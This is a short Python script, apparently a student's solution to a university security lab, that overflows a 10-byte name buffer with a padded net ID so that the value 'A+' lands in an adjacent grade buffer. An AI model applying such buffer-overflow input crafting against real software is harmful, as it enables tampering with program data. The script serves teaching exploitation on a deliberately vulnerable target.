#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

'''directly overwrite grade buffer using name buffer'''

NAME_BUFFER_SIZE = 10
NETID = 'hongboz2'

sys.stdout.buffer.write(NETID.encode('UTF-8')+b'\00'*(NAME_BUFFER_SIZE-len(NETID))+b'A+')